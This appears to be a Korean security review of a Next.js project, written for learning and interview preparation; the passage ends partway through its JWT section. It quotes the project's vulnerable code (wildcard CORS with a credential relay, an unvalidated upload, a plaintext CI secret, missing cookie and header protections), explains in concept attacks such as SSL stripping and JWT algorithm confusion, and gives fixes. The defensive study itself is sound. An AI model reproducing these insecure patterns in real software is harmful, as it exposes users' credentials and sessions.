# pLAWcess 보안 위험 심층 분석 보고서

- **작성일**: 2026-05-11
- **목적**: 보안 학습 및 면접 준비 — 실제 프로젝트에서 발견된 이슈를 통한 체계적 학습
- **선행 문서**: `docs/superpowers/plans/2026-05-11-security-remediation.md` (실행 계획서)
- **기술 스택**: Next.js 16 (App Router, Route Handlers), Prisma 7, PostgreSQL (Supabase), JWT (jsonwebtoken + jose), bcryptjs, React 19

---

## 0. 사전 개념 정리

### 0.1 CIA Triad
보안의 3대 목표:
- **Confidentiality (기밀성)**: 인가된 주체만 정보 접근. → 암호화, 인가 제어, 쿠키 `HttpOnly`.
- **Integrity (무결성)**: 데이터가 변조되지 않음. → 서명 (JWT), 해시, DB 제약.
- **Availability (가용성)**: 정당한 요청은 처리됨. → rate limit, DDoS 방어, 백업.

### 0.2 Defense in Depth (다층 방어)
단일 방어선에 의존하지 않음. 예: admin 페이지 보호 = ① middleware role check + ② API route 내부 `requireAdmin()` + ③ FE layout server-side redirect. 한 층 뚫려도 다음 층에서 막힘.

### 0.3 Threat Modeling — STRIDE
Microsoft 가 제안한 위협 분류 체계. 본 보고서 항목들을 매핑하면:
- **S**poofing (신원 위장) → JWT audience 비강제 (H3)
- **T**ampering (변조) → 파일 업로드 무검증 (C2)
- **R**epudiation (부인) → 토큰 revocation 부재 (M1)
- **I**nformation Disclosure (정보 누출) → 에러 스택트레이스 (M5), CI 시크릿 (C3)
- **D**enial of Service → rate limit 인메모리 (M2), 파일 크기 무제한 (C2)
- **E**levation of Privilege → CORS 와일드카드 (C1), 클라이언트 role 가드 (M6)

### 0.4 OWASP Top 10 (2021) 매핑
본 프로젝트 발견 이슈는 대부분 OWASP Top 10 의 단골:
- A01 Broken Access Control → C1, M6
- A02 Cryptographic Failures → H1 (쿠키 Secure)
- A03 Injection → (Prisma 사용으로 자동 방어 ✓)
- A04 Insecure Design → C1 (자격증명 릴레이)
- A05 Security Misconfiguration → H2 (보안 헤더), C3 (CI)
- A07 Identification & Authentication Failures → H3, M1, M4
- A08 Software & Data Integrity Failures → C2 (파일 검증)
- A09 Security Logging Failures → (별도 감사 필요)

---

## 1. CRITICAL 등급 심층 분석

### C1. `/api/mentee/grades` — CORS 와일드카드 + 자격증명 릴레이

#### 위치 및 코드
`apps/api/src/app/api/mentee/grades/route.ts:7-11, 28`
```ts
const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};
// ...
const { id, pw } = await req.json();
const proc = spawn('python3', [scriptPath, outputFile, '--id', id, '--pw', pw]);
```

#### 1) 개발 과정에서 흔한 상황인가? — **매우 흔함**
- **CORS `*`**: 신입 개발자가 처음 만나는 "CORS 오류" 를 가장 빨리 없애는 방법. 검색하면 첫 결과로 `*` 가 나옴 → 임시방편이 그대로 prod 배포되는 패턴.
- **자격증명 릴레이**: 학교·은행·정부 포털 자동화는 한국 IT 에서 매우 흔함 (스크래핑 기반 가계부, 성적 표시 앱 등). 표준 OAuth 가 없어 평문 id/pw 를 받아서 외부 사이트에 로그인 → 데이터 가져오는 패턴.
- **실제 사고**: 2019년 가계부 앱 "뱅크샐러드" 의 공인인증서 비밀번호 평문 전송 논란, 토스의 스크래핑 방식 보안성 논쟁.

#### 2) 발생 원인 — 기술 기반 설명

**Same-Origin Policy (SOP)**:
- 브라우저가 강제하는 정책. JS 가 자신의 origin (scheme://host:port) 과 다른 origin 의 응답을 **읽을 수 없음**.
- 단, 요청 자체는 갈 수 있음 (e.g. `<img src>`, form POST). 그래서 CSRF 가 발생.

**CORS (Cross-Origin Resource Sharing)**:
- 서버가 명시적으로 "이 origin 은 응답 읽어도 됨" 알림.
- 핵심 헤더: `Access-Control-Allow-Origin`.
- **preflight**: PUT/DELETE/PATCH 또는 커스텀 헤더 사용 시 `OPTIONS` 요청 먼저 발송 → 서버가 허용 origin·메서드·헤더 응답.
- 와일드카드 `*` 는 credentials 모드 (`fetch(..., { credentials: 'include' })`) 와 호환 불가 → 브라우저가 차단. **그러나 credentials 안 쓰는 요청은 `*` 로 모두 통과**.

**Next.js Route Handler 의 미들웨어 우회**:
- `proxy.ts` 는 `matcher: '/api/:path*'` 로 모든 `/api/` 요청에 적용되지만, 라우트 핸들러가 자체 응답에 CORS 헤더를 박으면 그 헤더가 최종 응답에 들어감.
- 즉 middleware 의 allowlist 와 route 의 `*` 가 **둘 다 응답에 포함**되어 브라우저는 보통 마지막 또는 더 관대한 값을 따름 (실제로는 미들웨어 → 핸들러 순으로 덮어쓰기 가능).

**Credential Relay 의 보안 모델**:
- 서버가 사용자의 외부 서비스 자격증명을 받아 외부 서비스에 로그인 → 데이터 수집.
- 문제:
  - 서버가 평문 자격증명을 메모리/로그에 보유.
  - 외부 서비스 입장에서는 "사용자 본인" 과 "서버" 가 구별 안 됨 (IP/UA 만 다름) → ToS 위반 가능, 학교 측 차단 사유.
  - MITM 시 자격증명 노출.

#### 3) 해결책

**일반적 해결책 (CORS)**:
1. **환경별 allowlist**:
   ```ts
   const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS?.split(',') ?? [];
   const origin = req.headers.get('origin');
   const allowOrigin = ALLOWED_ORIGINS.includes(origin) ? origin : '';
   ```
2. **Origin echo 패턴**: 요청 origin 이 allowlist 에 있으면 그대로 응답.
3. **Credentialed 요청**: `Access-Control-Allow-Credentials: true` + 명시적 origin (와일드카드 금지).

**일반적 해결책 (Credential Relay)**:
1. **OAuth / SAML / OpenID Connect** (가능 시): 표준 federated auth.
2. **Vault 모델** (외부 서비스가 OAuth 미제공 시):
   - 1회 수집 → KMS/HSM 기반 암호화 저장 → 백엔드만 복호화 가능.
   - 사용 시점에 vault 조회 후 메모리에 짧게 보유.
   - 기술: HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager, Supabase pgcrypto.
3. **Browser extension 모델**: 사용자 브라우저에서 직접 외부 사이트 로그인 → 결과만 서버로 전송 (자격증명은 서버 미경유).
4. **표준 API 협의**: 학교/기관에 API 발급 요청.

**본 프로젝트 선택**:
- 단기: CORS allowlist 즉시 적용 (proxy.ts 와 동일).
- 중장기: 자격증명 vault 모델 (별도 spec 필요). 학교 API 협의 가능성 우선 검토.

#### 4) 면접 포인트
- "CORS 와 SOP 의 차이?" → SOP 는 브라우저 정책, CORS 는 그 예외 메커니즘.
- "왜 `Access-Control-Allow-Origin: *` 가 credentials 와 호환 안 되나?" → 명세상 credentials 포함 시 명시적 origin 필요. 와일드카드는 너무 광범위해 자격증명 노출 위험.
- "preflight 가 왜 필요한가?" → 서버가 비표준 요청을 사전 차단할 기회 + 캐시 (`Access-Control-Max-Age`) 로 성능.
- "자격증명 릴레이를 안전하게 하려면?" → 자격증명 자체를 서버가 보유하지 않는 구조 (OAuth) 가 최선. 불가하면 vault + 짧은 메모리 보유 + 감사 로깅.

---

### C2. `personal-statement` HWP 업로드 무검증

#### 위치 및 코드
`apps/api/src/app/api/mentee/personal-statement/route.ts:100-115`
```ts
const formData = await req.formData();
const file = formData.get("hwp");
if (!file || !(file instanceof Blob)) {
  return NextResponse.json({ error: "hwp 파일이 없습니다" }, { status: 400 });
}
const bytes = Buffer.from(await file.arrayBuffer());
await prisma.menteeRecord.upsert({
  // ...
  update: { personal_statement_hwp_ga: bytes }
});
```

#### 1) 개발 과정에서 흔한 상황인가? — **매우 흔함**
- OWASP 의 영원한 단골. 신입 개발자가 "파일 받기" 를 처음 구현할 때 검증 빠뜨림.
- **실제 사고**:
  - 2017 Equifax: 업로드 검증 우회 + Struts 취약점.
  - 2019 ImageMagick "ImageTragick": SVG 업로드 → RCE.
  - 한국 사례: 채용 사이트 이력서 업로드 → 악성 PDF 매크로 → 인사담당자 PC 감염.

#### 2) 발생 원인 — 기술 기반 설명

**HTML form 의 신뢰 불가**:
- `<input type="file" accept=".hwp">` 의 `accept` 는 UX 힌트일 뿐. 사용자가 개발자 도구 / curl 로 우회 가능.
- 클라이언트가 보내는 `Content-Type` (MIME) 도 신뢰 불가 — 헤더는 임의 조작 가능.

**Next.js `formData` API**:
- Web Standard `FormData` 사용. body parser 단계에서 자동 크기 제한 없음.
- Next.js 의 default body size limit (1MB JSON) 은 `req.json()` 에 적용. `formData()` 는 별도.
- `Blob.arrayBuffer()` 는 메모리에 전체 로드 → 1GB 파일이면 1GB RAM.

**Prisma `Bytes` (bytea) 컬럼**:
- PostgreSQL `bytea` 는 1GB 까지 저장 가능. 크기 제약 없음.
- DB 에 큰 binary 저장 = 백업 폭증 + 쿼리 성능 저하 + 캐시 무효.

**파일 타입 검증의 신뢰성 순서**:
1. **확장자 (least)**: 단순 문자열, 변조 자유.
2. **MIME type from client**: HTTP 헤더, 변조 자유.
3. **MIME type from server-side sniffing**: `file-type` 라이브러리 등. 파일 첫 바이트 분석.
4. **Magic number (file signature, most reliable)**: 파일 포맷 고유의 첫 바이트 패턴.
   - PDF: `25 50 44 46` (`%PDF`)
   - PNG: `89 50 4E 47`
   - HWP 5.0: OLE Compound Document signature `D0 CF 11 E0 A1 B1 1A E1`
   - HWPX: ZIP signature `50 4B 03 04` + 내부 `mimetype` 파일 확인.
5. **Deep validation**: 파일 구조 파싱 (e.g. PDF 의 stream object).

#### 3) 해결책

**표준 체크리스트**:
1. **크기 상한**: `file.size > MAX_BYTES` 즉시 거부 (arrayBuffer 호출 전).
2. **확장자 화이트리스트**: 블랙리스트는 우회 쉬움.
3. **매직 넘버 검증**: 서버 측에서 첫 N 바이트 검사.
4. **MIME sniffing**: 서버에서 재추론.
5. **저장 분리**:
   - **DB 가 아니라 object storage** (S3, Supabase Storage, GCS) + signed URL.
   - **별도 도메인 (sandbox) 에서 서빙**: `cdn.example.com` 같은 별도 origin → 업로드된 SVG 가 XSS 못 일으킴.
   - HTML/SVG 는 가급적 이미지로 변환하거나 sanitize.
6. **바이러스 스캔**: ClamAV 같은 도구 통합 (특히 사용자 간 공유 시).
7. **Rate limit + 사용자별 quota**.

**본 프로젝트 선택**:
- 즉시: 크기 + 확장자 + 매직넘버 (계획서 §C2).
- 중기: Supabase Storage 로 이전 + signed URL 서빙.

#### 4) 면접 포인트
- "MIME type 만 검증하면 안 되는 이유?" → 클라이언트가 보낸 헤더라 신뢰 불가.
- "매직 넘버가 뭐고 왜 신뢰 가능한가?" → 파일 포맷 명세에 정의된 고유 시그니처. 변조하면 해당 포맷으로 사용 불가해짐.
- "업로드된 파일을 같은 도메인에서 서빙하면 왜 위험한가?" → 사용자가 업로드한 HTML/SVG 가 같은 origin 으로 실행되어 XSS. → 별도 sandbox 도메인 권장.
- "Stored XSS via SVG" 사례 설명 가능해야.

---

### C3. CI 워크플로 `JWT_SECRET` 평문

#### 위치
`.github/workflows/ci.yml` — `env: JWT_SECRET: ci-secret-for-build`

#### 1) 개발 과정에서 흔한 상황인가? — **매우 흔함**
- 빌드/테스트가 환경변수 부재로 실패 → 빠르게 dummy 값 박음 → 그대로 머지.
- **실제 사고**:
  - Uber 2016: GitHub repo 에 AWS key 노출 → 5700만 명 정보 유출.
  - 2023 Mercedes-Benz: GitHub token 노출 → 내부 소스 코드 유출.
  - GitHub Secret Scanning 통계: 매일 수만 건의 secret 노출 탐지.

#### 2) 발생 원인 — 기술 기반 설명

**GitHub Actions 의 secret 처리**:
- `${{ secrets.NAME }}` 패턴: 런타임에 주입, 로그에서 자동 마스킹.
- `env: NAME: literal_value`: 평문 그대로. 마스킹 대상 아님.
- 동작은 동일 → 차이를 인지 못함.

**YAML 의 인지적 함정**:
- 한 줄 변경이 자동으로 secret 으로 인식되지 않음.
- `secrets.` 접두사를 누락해도 빨간 줄 안 뜸.

**Git history 의 영속성**:
- 한 번 커밋된 secret 은 history 에서 지워도 GitHub 캐시/포크/Wayback Machine 에 남을 수 있음.
- public repo 라면 mass scanner 가 분 단위로 스캔.

#### 3) 해결책

**표준 해결책**:
1. **GitHub Secrets / Environment Secrets**: UI 에서 등록 → `${{ secrets.X }}` 참조.
2. **OIDC 기반 cloud auth**: AWS/GCP IAM Role assume → secret 자체를 안 둠.
3. **secret scanning 자동화**:
   - `gitleaks` pre-commit hook.
   - GitHub Advanced Security 의 push protection.
   - `trufflehog` CI step.
4. **이미 노출된 secret**: 즉시 rotate (history 정리는 부수적).
5. **변수명 분리**: `JWT_SECRET_CI` vs `JWT_SECRET_PROD` — 사고 시 영향 격리.

**본 프로젝트 선택**:
- 즉시 `${{ secrets.CI_JWT_SECRET }}` 이관.
- gitleaks pre-commit hook 추가 검토.

#### 4) 면접 포인트
- "GitHub Actions 에서 secret 을 안전하게 다루는 법?" → secrets context 사용, env block 평문 금지, OIDC 도입.
- "git history 에서 secret 이 노출되면?" → rotate 가 우선. `git filter-branch`/`bfg` 로 history 재작성 가능하지만 이미 fetch 된 곳은 막을 수 없음.
- "왜 prod 와 CI 키를 분리해야 하나?" → blast radius 격리. CI 키 노출이 prod 영향 미치지 않도록.

---

## 2. HIGH 등급 심층 분석

### H1. 쿠키 `Secure` 플래그 누락

#### 위치
`apps/api/src/lib/auth.ts:43`
```ts
return `${COOKIE_NAME}=${token}; HttpOnly; Path=/; Max-Age=${maxAge}; SameSite=Lax`;
```

#### 1) 흔한 상황인가? — **매우 흔함**
- 로컬 개발은 HTTP (`localhost`) → `Secure` 추가 시 쿠키가 안 박힘 → 개발 편의로 뺌 → prod 도 그대로.
- 환경 분기를 깜빡하는 가장 단골 패턴.

#### 2) 발생 원인 — 기술 기반 설명

**HTTP Cookie 의 보안 속성** (RFC 6265bis):
| 속성 | 의미 | 방어 위협 |
|---|---|---|
| `HttpOnly` | JS `document.cookie` 접근 차단 | XSS 토큰 탈취 |
| `Secure` | HTTPS 에서만 전송 | MITM 평문 노출 |
| `SameSite=Strict` | 모든 cross-site 요청에서 제외 | CSRF |
| `SameSite=Lax` | top-level GET 만 허용 | CSRF (완화) |
| `SameSite=None` | 모든 요청에 포함 (Secure 필수) | (cross-site 의도 시) |
| `Domain` | 쿠키 유효 도메인 | (잘못 설정 시 subdomain 누설) |
| `Path` | 쿠키 유효 path | scope 제한 |
| `__Host-` prefix | Path=/, Secure, Domain 미지정 강제 | subdomain 공격 |
| `__Secure-` prefix | Secure 강제 | 평문 전송 |

**localhost 의 예외**:
- 최신 브라우저는 `localhost` 에서 `Secure` 쿠키도 동작 (HTTPS 가 아니어도). 그래서 사실 dev 환경에서도 `Secure` 켜도 됨 — "동작 안 한다" 는 오해.
- 단 `127.0.0.1` 이나 `*.local` 은 브라우저별 차이 있음.

**수동 쿠키 조립 vs API 사용**:
- 본 프로젝트는 `Set-Cookie` 문자열 수동 조립 — 깜빡하기 쉬움.
- `cookies().set({ name, value, secure, httpOnly, sameSite })` API 사용 시 IDE 자동완성으로 누락 방지.

#### 3) 해결책

**표준 패턴**:
```ts
const isProd = process.env.NODE_ENV === 'production';
return `${COOKIE_NAME}=${token}; HttpOnly; Path=/; Max-Age=${maxAge}; SameSite=Lax${isProd ? '; Secure' : ''}`;
```

**더 안전한 패턴 — `__Host-` prefix**:
```ts
// 이름 자체에 __Host- 접두사 + Domain 미지정 + Path=/ + Secure 강제
return `__Host-${COOKIE_NAME}=${token}; HttpOnly; Secure; Path=/; SameSite=Lax; Max-Age=${maxAge}`;
```
- 브라우저가 검증 — Domain 지정하거나 Path 가 `/` 아니면 쿠키 자체 reject.
- subdomain 탈취 방어 (e.g. `evil.example.com` 이 `example.com` 쿠키 못 박음).

**본 프로젝트 선택**:
- 1단계: env 분기 (`Secure` 조건부).
- 2단계: Next.js `cookies()` API 로 마이그레이션 (옵션 객체 명시).
- 3단계: `__Host-` prefix 검토 (subdomain 운영 정책 확인 후).

#### 4) 면접 포인트
- "쿠키의 `HttpOnly` 와 `Secure` 차이?" → 전자는 JS 접근 차단 (XSS 방어), 후자는 HTTPS 전송 강제 (MITM 방어).
- "`SameSite=Lax` 와 `Strict` 의 trade-off?" → Strict 는 외부 링크 클릭 시도 쿠키 미전송 → "로그아웃 상태로 보임" UX 이슈. Lax 는 top-level GET 허용 → 그 갭으로 CSRF 가능성 (드물지만).
- "토큰을 쿠키에 두는 게 localStorage 보다 안전한 이유?" → HttpOnly 로 JS 접근 차단 → XSS 한 번 발생 시에도 토큰 탈취 못함. localStorage 는 무방비.

---

### H2. 보안 헤더 전무

#### 위치
`apps/api/next.config.ts`, `apps/web/next.config.mjs` — `headers()` 콜백 미정의.

#### 1) 흔한 상황인가? — **매우 흔함**
- Next.js, Express, Django 등 기본 설정에 보안 헤더 없음.
- securityheaders.com 의 글로벌 통계: 대부분 사이트가 D 이하.
- 시큐어코딩 가이드 (KISA) 에서도 명시적으로 권장하나 실무에선 자주 누락.

#### 2) 발생 원인 — 기술 기반 설명

**HTTP 응답 헤더의 명시성**:
- 응답 헤더는 서버가 명시적으로 설정하지 않으면 빠짐.
- 프레임워크의 default 가 보안 측 비활성이라 추가 작업 필요.

**각 헤더의 메커니즘**:

**Strict-Transport-Security (HSTS)**:
- `max-age=63072000; includeSubDomains; preload`
- 브라우저가 해당 도메인에 HTTPS 만 사용하도록 강제 (지정 기간 동안).
- 첫 방문 시점에 헤더 받아야 적용 → "first request" 가 여전히 평문 위험.
- 해결: **HSTS Preload List** 등록 → 브라우저에 hardcode.
- 방어 위협: SSL Stripping 공격 (MITM 이 HTTPS → HTTP 다운그레이드).

**Content-Security-Policy (CSP)**:
- 가장 강력하지만 가장 어려운 헤더.
- 어떤 origin 의 script/style/image/iframe 을 허용할지 명시.
- 예: `default-src 'self'; script-src 'self' 'nonce-xyz'; img-src 'self' https://cdn.example.com`
- **XSS 의 마지막 방어선**: 코드에 XSS 가 있어도 inline script 차단으로 실행 불가.
- 도입 어려움:
  - inline script/style 다수 → `'unsafe-inline'` 안 쓰면 깨짐.
  - Next.js 의 hydration script 가 inline → nonce 또는 hash 처리 필요.
- 전략: **Report-Only 모드** 로 시작 (`Content-Security-Policy-Report-Only`) → 위반 보고 수집 → 정책 다듬기 → enforce.

**X-Frame-Options / `frame-ancestors`**:
- `DENY` 또는 `SAMEORIGIN`.
- 다른 사이트가 우리 페이지를 iframe 으로 못 박게 함.
- 방어 위협: **Clickjacking** (투명 iframe 위에 가짜 버튼 → 사용자 클릭 가로채기).
- CSP `frame-ancestors` 가 신규 표준 (XFO 는 deprecated 진행 중).

**X-Content-Type-Options: nosniff**:
- 브라우저가 Content-Type 을 추측하지 않도록 강제.
- 방어 위협: 서버가 `text/plain` 반환했는데 브라우저가 HTML 로 sniff → XSS.

**Referrer-Policy**:
- 외부 사이트 이동 시 Referer 헤더에 무엇을 보낼지.
- `strict-origin-when-cross-origin`: 동일 origin 은 full URL, cross-origin 은 origin 만.
- 방어 위협: URL 에 토큰/세션 ID 포함 시 외부 사이트로 누설.

**Permissions-Policy** (구 Feature-Policy):
- 카메라/마이크/위치 등 강력 API 사용 제한.
- 방어 위협: XSS 가 발생해도 권한 자체를 사전 차단.

#### 3) 해결책

**Next.js `headers()` 콜백**:
```js
// next.config.mjs
const securityHeaders = [
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
];
export default {
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }];
  },
};
```

**CSP 도입 단계**:
1. `Content-Security-Policy-Report-Only` 로 시작 + `report-uri` 또는 `report-to` 지정.
2. 1-2주 위반 로그 수집.
3. `'nonce-xyz'` 동적 생성 (middleware 에서 nonce 발급 → `<Script nonce={nonce}>`).
4. enforce 로 전환.

**Express 의 helmet**:
- `app.use(helmet())` 한 줄로 위 헤더 대부분 적용.
- Next.js 는 동등한 메타-라이브러리가 없어 수동 작성 필요.

**Vercel / CDN 단 설정**:
- `vercel.json` 의 `headers` 필드.
- Cloudflare Workers / Page Rules.
- 주의: Next 와 CDN 양쪽 설정 시 충돌.

**본 프로젝트 선택**:
- `next.config.mjs` 에 헤더 정의 (코드와 함께 버전 관리).
- CSP 는 Report-Only 로 시작.

#### 4) 면접 포인트
- "CSP 의 핵심 directive 들?" → `default-src`, `script-src`, `style-src`, `img-src`, `connect-src`, `frame-ancestors`, `base-uri`, `form-action`.
- "CSP 가 어떻게 XSS 를 막나?" → inline script 차단 + 외부 script origin 화이트리스트 → 공격자가 코드 주입해도 실행 못함.
- "HSTS 의 first-visit 문제와 해결?" → HSTS Preload List 등록 (`hstspreload.org`).
- "Clickjacking 이 뭐고 어떻게 막나?" → 투명 iframe 으로 UI 가로채기. XFO `DENY` 또는 CSP `frame-ancestors 'none'`.

---

### [H1·H2 보충] HTTPS 가 적용되어도 HTTP 통신이 발생할 수 있는 경로

H1 (`Secure` 플래그) 과 H2 (HSTS) 가 **둘 다** 필요한 이유를 이해하려면 "HTTPS 가 적용된 사이트에서도 HTTP 통신이 실제로 발생할 수 있는 경로" 를 알아야 함. 단일 방어선이 부족한 근거.

#### 1) 브라우저 기본 동작

- **주소창에 스킴 없이 입력**: `example.com` 만 치면 브라우저는 보통 `http://` 부터 시도 → 서버가 `301` 로 리다이렉트하지만 **첫 요청은 평문**. 그 첫 요청에 쿠키 (Secure 없으면) / Referer / 헤더 노출.
- **오래된 북마크 / 외부 링크 / 이메일 본문**: `http://` 링크를 누적된 곳에서 클릭 시도 같은 결과.
- Chrome 90+ / Firefox 91+ 의 HTTPS-First Mode 가 HTTPS 우선 시도하지만 universal 하지 않음 (사용자 설정·구버전 의존).

#### 2) HSTS 부재 (가장 중요한 원인)

- `Strict-Transport-Security` 헤더가 없으면 매 fresh 방문이 HTTP 거침.
- HSTS 헤더는 **첫 HTTPS 응답을 받아야 학습** — 첫 방문 문제 (first request problem) 가 남음.
- 해결: **HSTS Preload List** (`hstspreload.org`) 등록 → 브라우저 소스코드에 hardcode → 첫 방문도 HTTPS 강제.

#### 3) SSL Stripping (MITM 다운그레이드 공격)

Moxie Marlinspike, 2009 (sslstrip).

```
Step 1) 사용자: example.com 입력
Step 2) 브라우저: http://example.com 요청
Step 3) 공격자(MITM): 가로챔 → 서버와는 HTTPS, 사용자와는 HTTP 유지
Step 4) 공격자: 서버 응답의 모든 https:// 링크를 http:// 로 재작성
Step 5) 사용자는 평생 HTTP 만 사용 → 자격증명·세션·쿠키 평문 노출
```

방어: HSTS (브라우저가 처음부터 HTTPS 만 시도) + HSTS Preload (첫 방문도 보호).

#### 4) Mixed Content

HTTPS 페이지 안에서 HTTP 리소스 로드.

| 종류 | 예시 | 최신 브라우저 동작 |
|---|---|---|
| Active Mixed | `<script>`, `<iframe>`, `fetch` | 차단 |
| Passive Mixed | `<img>`, `<video>`, `<audio>` | 경고 + 자동 업그레이드 시도 |

발생 원인: 외부 CDN/이미지 호스팅을 HTTP URL 로 박음, DB 에 저장된 user content 의 HTTP URL, 마이그레이션 누락된 하드코딩.

방어: CSP `upgrade-insecure-requests` (자동 변환) 또는 `block-all-mixed-content` (차단).

#### 5) 쿠키 `Secure` 플래그 누락 (H1 직접 연관)

- `Secure` 없으면 HTTP 요청에도 쿠키 전송.
- HSTS 적용 도메인이라도 다른 도메인의 HTTP 요청에 의도치 않게 포함되는 케이스 등에서 노출 가능.
- 즉 `Secure` 와 HSTS 는 **둘 다** 필요 — 서로의 빈틈을 보완.

#### 6) 인프라 단의 함정

- **CDN "Flexible SSL"** (Cloudflare 유명 함정):
  ```
  사용자 <--HTTPS--> Cloudflare <--HTTP--> Origin
  ```
  사용자 입장에선 자물쇠 보임 → 안전 오인. CDN ↔ Origin 평문 → 인터넷 거치면 MITM 가능. 해결: "Full (Strict)" 모드 + Origin TLS 인증서.
- **Load Balancer / Reverse Proxy 의 TLS 종료**:
  ```
  사용자 <--HTTPS--> ALB <--HTTP--> Backend
  ```
  내부망 신뢰 가정. lateral movement 시 평문 노출. 해결: mTLS / service mesh (Istio, Linkerd) 의 자동 mTLS.
- **WebSocket 평문 (`ws://` vs `wss://`)**: `ws://` 는 평문, `wss://` 가 TLS. HTTPS 페이지에서 `ws://` 호출은 Mixed Content 차단.
- **인증서 만료·오설정**: 사용자가 경고 무시 → 사실상 TLS 무효.

#### 7) 애플리케이션 코드 단

- `fetch('http://api...')` 처럼 명시적 HTTP URL.
- Protocol-relative URL (`//example.com/...`): HTTPS 페이지에서는 HTTPS, HTTP 페이지에서는 HTTP 로 해석. HTTPS 페이지가 어쩌다 HTTP 로 로드된 경우 위험.
- 환경변수의 dev 기본값 (`http://localhost:3001`) 이 prod 빌드까지 잔류.

#### 8) 개발 환경 함정

- **localhost 의 특수성**: 브라우저가 localhost 를 **secure context** 로 취급 → HTTP 여도 `Secure` 쿠키·Web Crypto·Service Worker 동작. dev 에서 잘 보이는 게 prod 에서 깨지는 원인.
- **Self-signed 인증서 무시**: `NODE_TLS_REJECT_UNAUTHORIZED=0` 환경변수 prod 잔류.

#### 9) 네트워크 환경

- **Captive Portal**: 호텔·공항 wifi 가 모든 요청을 portal 로 리다이렉트.
- **DNS Hijacking**: DNS 응답 조작 → 공격자 서버 유도. 방어: HSTS Preload + DNSSEC + DoH (DNS over HTTPS).
- **ISP / 정부 검열**: HTTPS 자체 차단 → 사용자가 HTTP fallback 시도하게 유도.

#### 본 프로젝트 매핑

| 원인 | 본 프로젝트 영향 | 해결 |
|---|---|---|
| 첫 방문 HTTP | HSTS 미설정 → 발생 | H2 (보안 헤더) |
| 외부 HTTP 링크 → 쿠키 노출 | `Secure` 미설정 → 발생 | H1 (Secure 플래그) |
| Mixed Content | 미점검 | CSP `upgrade-insecure-requests` |
| CDN 오설정 | Vercel automatic full TLS → 영향 없음 | (해당 없음) |
| 코드 내 `http://` | `apps/web/next.config.mjs:7` 에 `http://localhost:3001` fallback | env 강제 + grep 점검 |
| localhost 의존 | dev/prod 분기 미적용 → 발생 | H1 해결 시 함께 |

#### 면접 포인트 (보강)

- **"HTTPS 가 적용되어 있는데 어떻게 HTTP 통신이 발생할 수 있나?"** → 위 카테고리 중 3가지 정도 언급. 특히 **SSL Stripping + HSTS first-visit** 조합.
- **"HSTS 만으로 SSL Stripping 을 완전히 막을 수 있나?"** → No. **첫 방문은 여전히 HTTP** → HSTS Preload List 필요.
- **"Cloudflare Flexible SSL 의 문제?"** → 사용자 ↔ CDN 만 TLS, CDN ↔ Origin 평문. "자물쇠 = 안전" 오해.
- **"Mixed Content 의 active 와 passive 차이?"** → script/iframe 등 DOM 조작 가능한 것은 차단, image 같은 정적 자원은 경고.
- **"`localhost` 에서 Secure 쿠키가 동작하는 이유?"** → 브라우저가 localhost 를 secure context 로 특별 취급.

---

### H3. JWT 라이브러리 이중 사용 + audience 비강제

#### 위치
- `apps/api/src/lib/auth.ts:1` → `import jwt from "jsonwebtoken"`
- `apps/api/src/proxy.ts:3` → `import { jwtVerify } from "jose"`
- `auth.ts:27-29` 주석: "audience 미강제: 기존 세션 토큰 호환을 위해"

#### 1) 흔한 상황인가?
- **라이브러리 이중 사용**: 의외로 흔함. **Next.js 의 Edge Runtime** 호환성 때문에 발생. `jsonwebtoken` 은 Node.js `crypto` 모듈 의존 → Edge runtime (middleware) 에서 사용 불가 → `jose` 추가 → 통일 안 하고 공존.
- **audience 비강제**: 매우 흔함. JWT verify 옵션을 모르거나 깜빡함.

#### 2) 발생 원인 — 기술 기반 설명

**JWT 구조** (RFC 7519):
```
header.payload.signature
```
- **header**: `{ alg, typ }` — 서명 알고리즘.
- **payload**: claims (`iss`, `sub`, `aud`, `exp`, `iat`, `nbf`, `jti` + custom).
- **signature**: `HMAC(secret, base64(header) + "." + base64(payload))`.

**표준 클레임의 역할**:
- `iss` (issuer): 발급자. 보통 검증 시 매칭.
- `sub` (subject): 토큰의 주체 (보통 user_id).
- `aud` (audience): "이 토큰이 누구를 위해 발급됐는가". 검증 시 매칭.
- `exp` (expiration): 만료 (Unix timestamp).
- `iat` (issued at): 발급 시각.
- `nbf` (not before): 이전엔 무효.
- `jti` (JWT ID): 고유 ID (blacklist 키로 사용).

**audience 의 보안적 역할**:
- 같은 secret 으로 여러 종류 토큰 발급 시 (session, password-reset, email-verification) 토큰 종류를 클레임으로 분리.
- audience 미검증 = `password-reset` 토큰을 session 으로 사용 가능 → **Token Type Confusion 공격**.
- 본 프로젝트: verification·reset 토큰은 자체 audience 강제, session 만 미강제 (기존 토큰 호환).

**Next.js Edge Runtime 제약**:
- Edge Runtime = V8 isolate, 일부 Node.js API 미지원 (특히 `crypto`, `fs`, `child_process`).
- `jsonwebtoken` 은 `crypto` 의존 → Edge 미지원.
- `jose` 는 Web Crypto API (글로벌 `crypto.subtle`) 사용 → Edge 호환.
- middleware 는 Edge 에서 실행 → middleware 에서 JWT verify 필요하면 `jose` 필수.

**서명 알고리즘 분류**:
- **HS256/384/512** (HMAC + SHA): 대칭 키. 검증자 = 발급자 (모두 같은 secret).
- **RS256/384/512** (RSA): 비대칭. 발급자만 private key, 검증자는 public key.
- **ES256** (ECDSA P-256): 비대칭, RSA 보다 짧음.
- **EdDSA** (Ed25519): 최신, 빠르고 안전.

**`alg: none` 공격**:
- 초기 JWT 라이브러리 취약점. `{ alg: 'none' }` 헤더 + signature 빈 토큰을 일부 lib 가 통과시킴.
- 현대 라이브러리는 명시적 alg allowlist 강제로 차단.

**Algorithm Confusion 공격**:
- RS256 으로 발급된 토큰을 공격자가 `{ alg: 'HS256' }` 으로 바꾸고 public key 를 HMAC secret 으로 사용.
- 일부 lib 가 alg 만 보고 검증 → 통과.
- 방어: verify 시 `algorithms: ['RS256']` 명시 (allowlist).

#### 3) 해결책

**라이브러리 통일**:
- Edge runtime 사용 시 → `jose` 통일.
- Node-only → `jsonwebtoken` 도 OK.
